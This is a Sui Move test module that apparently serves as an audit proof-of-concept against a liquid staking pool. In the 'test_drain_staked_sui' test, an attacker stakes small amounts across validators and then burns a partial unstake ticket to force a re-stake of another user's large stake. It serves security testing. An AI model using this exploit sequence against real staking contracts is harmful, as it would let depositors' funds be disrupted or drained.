// SPDX-License-Identifier: MIT

#[test_only]
module liquid_staking::otter_tests1 {

    use liquid_staking::native_pool::{Self, NativePool};
    use liquid_staking::cert::{Self, Metadata, CERT};
    use liquid_staking::ownership::{Self};
    use liquid_staking::unstake_ticket::UnstakeTicket;
    use sui::test_scenario::{Self, next_tx, ctx, Scenario};
    use sui::sui::{SUI};
    use sui::coin;
    use std::debug;
    use std::string;
    use sui_system::sui_system::{SuiSystemState};
    use sui_system::governance_test_utils::{
        advance_epoch,
        create_validator_for_testing,
        create_sui_system_state_for_testing,
    };

    const MIST_PER_SUI: u64 = 1_000_000_000;
    const SENDER: address = @0x0;

    /* Migrations */

    fun debug_print<T>(s: vector<u8>, val: &T) {
        debug::print(&string::utf8(s));
        debug::print(val);
    }

    fun set_up_native_pool(): Scenario {
        let scenario = test_scenario::begin(SENDER);
        let ctx = ctx(&mut scenario);

        let validators = vector[
            create_validator_for_testing(@0xAB1, 100, ctx),
            create_validator_for_testing(@0xAB2, 100, ctx)
        ];
        create_sui_system_state_for_testing(validators, 0, 0, ctx);

        native_pool::test_init(ctx);
        ownership::test_init(ctx);
        cert::test_init(ctx);

        next_tx(&mut scenario, SENDER);
        {
            let pool = test_scenario::take_shared<NativePool>(&mut scenario);
            native_pool::test_update_and_sort(&mut pool, vector[@0xAB1, @0xAB2], vector[2, 1]);
            test_scenario::return_shared(pool);
        };

        scenario
    }

    #[test]
    fun test_drain_staked_sui() {
        let scenario = set_up_native_pool();

        let evil_cert: coin::Coin<CERT> = coin::zero(ctx(&mut scenario));
        let normal_cert: coin::Coin<CERT> = coin::zero(ctx(&mut scenario));

        // normal user stakes a lot of SUI
        next_tx(&mut scenario, SENDER);
        {
            let pool = test_scenario::take_shared<NativePool>(&scenario);
            let metadata = test_scenario::take_shared<Metadata<CERT>>(&scenario);
            let system_state = test_scenario::take_shared<SuiSystemState>(&scenario);

            // stake 0xab1 validator
            native_pool::test_update_and_sort(&mut pool, vector[@0xab1, @0xab2], vector[2, 1]);
            let sui = coin::mint_for_testing<SUI>(MIST_PER_SUI*100, ctx(&mut scenario));
            let cert0 = native_pool::stake_non_entry(&mut pool, &mut metadata, &mut system_state, sui, ctx(&mut scenario));
            coin::join(&mut normal_cert, cert0);

            test_scenario::return_shared(pool);
            test_scenario::return_shared(metadata);
            test_scenario::return_shared(system_state);
        };

        // evil user stakes 2 SUI, 1 SUI per each validator
        next_tx(&mut scenario, SENDER);
        {
            let pool = test_scenario::take_shared<NativePool>(&scenario);
            let metadata = test_scenario::take_shared<Metadata<CERT>>(&scenario);
            let system_state = test_scenario::take_shared<SuiSystemState>(&scenario);

            // stake 0xab2 validator
            native_pool::test_update_and_sort(&mut pool, vector[@0xab1, @0xab2], vector[1, 2]);
            let sui = coin::mint_for_testing<SUI>(MIST_PER_SUI, ctx(&mut scenario));
            let cert0 = native_pool::stake_non_entry(&mut pool, &mut metadata, &mut system_state, sui, ctx(&mut scenario));
            coin::join(&mut evil_cert, cert0);

            // stake 0xab1 validator
            native_pool::test_update_and_sort(&mut pool, vector[@0xab1, @0xab2], vector[2, 1]);
            let sui = coin::mint_for_testing<SUI>(MIST_PER_SUI, ctx(&mut scenario));
            let cert1 = native_pool::stake_non_entry(&mut pool, &mut metadata, &mut system_state, sui, ctx(&mut scenario));
            coin::join(&mut evil_cert, cert1);

            test_scenario::return_shared(pool);
            test_scenario::return_shared(metadata);
            test_scenario::return_shared(system_state);
        };

        // state now:
        /*
            sorted_validators: 0xab1, 0xab2
            stakes:
                0xab1: [ 100 SUI, 1 SUI ]
                0xab2: [ 1 SUI ]
        */

        // some time passes, and the normal user wants to unstake their money (100SUI)
        next_tx(&mut scenario, SENDER);
        {
            advance_epoch(&mut scenario);
        };
        next_tx(&mut scenario, SENDER);
        {
            advance_epoch(&mut scenario);
        };

        let ticket: UnstakeTicket;
        // normal user prepares the unstake ticket
        next_tx(&mut scenario, SENDER);
        {
            let pool = test_scenario::take_shared<NativePool>(&scenario);
            let metadata = test_scenario::take_shared<Metadata<CERT>>(&scenario);
            let system_state = test_scenario::take_shared<SuiSystemState>(&scenario);

            ticket = native_pool::mint_ticket_non_entry(&mut pool, &mut metadata, normal_cert, ctx(&mut scenario));

            test_scenario::return_shared(pool);
            test_scenario::return_shared(metadata);
            test_scenario::return_shared(system_state);
        };

        next_tx(&mut scenario, SENDER);
        {
            advance_epoch(&mut scenario);
        };

        let attack = true;
        // abuse the condition to cause re-stake of the huge stake stored in the validator
        if (attack) {
            // unstake
            next_tx(&mut scenario, SENDER);
            {
                let pool = test_scenario::take_shared<NativePool>(&scenario);
                let metadata = test_scenario::take_shared<Metadata<CERT>>(&scenario);
                let system_state = test_scenario::take_shared<SuiSystemState>(&scenario);

                let partial_cert = coin::split(&mut evil_cert, MIST_PER_SUI+1, ctx(&mut scenario));
                let ticket = native_pool::mint_ticket_non_entry(&mut pool, &mut metadata, partial_cert, ctx(&mut scenario));
                let sui = native_pool::burn_ticket_non_entry(&mut pool, &mut system_state, ticket, ctx(&mut scenario));
                debug_print(b"[~~~testcase~~~] sui after unstake", &coin::value(&sui));
                coin::burn_for_testing(sui);

                test_scenario::return_shared(pool);
                test_scenario::return_shared(metadata);
                test_scenario::return_shared(system_state);
            };
        };

        // unstake
        next_tx(&mut scenario, SENDER);
        {
            let pool = test_scenario::take_shared<NativePool>(&scenario);
            let metadata = test_scenario::take_shared<Metadata<CERT>>(&scenario);
            let system_state = test_scenario::take_shared<SuiSystemState>(&scenario);

            let sui = native_pool::burn_ticket_non_entry(&mut pool, &mut system_state, ticket, ctx(&mut scenario));
            debug_print(b"[~~~testcase~~~] sui after unstake", &coin::value(&sui));
            coin::burn_for_testing(sui);
            coin::burn_for_testing(evil_cert);

            test_scenario::return_shared(pool);
            test_scenario::return_shared(metadata);
            test_scenario::return_shared(system_state);
        };

        test_scenario::end(scenario);
    }
}
